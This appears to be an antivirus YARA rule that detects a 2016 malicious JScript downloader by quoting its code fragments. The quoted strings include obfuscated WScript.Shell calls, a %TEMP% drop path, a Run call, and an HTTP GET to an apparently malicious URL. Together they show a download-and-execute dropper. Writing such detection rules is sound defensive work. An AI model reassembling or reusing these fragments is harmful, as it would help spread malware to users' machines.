rule sig_20160427_53f8c7587795a73cfd9cf5784fcba470 {
  meta:
    description = "datamaliciousorder - file 20160427_53f8c7587795a73cfd9cf5784fcba470.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "94e730d454ae39c233147f0e5f252f021a9641176a30e0d931d91f32cceba419"

  strings:
    $s1  = "IycqjQkpxi[AuljxWbldj](\"G\" + \"ET\", \"http://soccerinsider.net/mys3ks\", false);" fullword ascii
    $s2  = "function AtzvhJygng() {return IikutEevik[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ic4HmXA" ascii
    $s3  = "function AtzvhJygng() {return IikutEevik[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ic4HmXA" ascii
    $s4  = "var IikutEevik = function QvwrlElgou() {return QtgqoFzlfq[WabmsBcooj](\"WScript\"+\".Shell\");}(), IejjkNtpot = 11;" fullword ascii
    $s5  = "function IdgzpYtgvl() {return ((JnxloGpuvz == true) && (JnxloGpuvz == FmhehWxjln)) ? 1 : QjkrkJhkfj;};" fullword ascii
    $s6  = "function SecfuGxzau(WxwmmWthdz, NrceoCbekb){QjkrkJhkfj = QjkrkJhkfj * 1; return WxwmmWthdz - NrceoCbekb;};" fullword ascii
    $s7  = "var QtgqoFzlfq = this[\"WScript\"];" fullword ascii
    $s8  = "var JnxloGpuvz = false;" fullword ascii
    $s9  = "JnxloGpuvz = true; " fullword ascii
    $s10 = "function CnvzgHjenv(){return KnplmOpfpg + \"\";};" fullword ascii
    $s11 = "if (IycqjQkpxi[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function SmsxaKghqd(VpuopPgufs) {var SdffjSaunj = (1, 2, 3, 4, 5, VpuopPgufs); return SdffjSaunj;};" fullword ascii
    $s13 = "}while (PbdfbGbbep);" fullword ascii
    $s14 = "function BsnlmObadi()" fullword ascii
    $s15 = "FmhehWxjln = true; " fullword ascii
    $s16 = "function AjxihZijqv(){return 23;};" fullword ascii
    $s17 = "var OyqpbPzzvo = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var FmhehWxjln = false;" fullword ascii
    $s19 = "function ZdmnhFaqmn(FaiwxVznoy){IikutEevik[\"R\"+\"un\"](FaiwxVznoy, QjkrkJhkfj, QjkrkJhkfj);};" fullword ascii
    $s20 = "VktphZqkqu = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}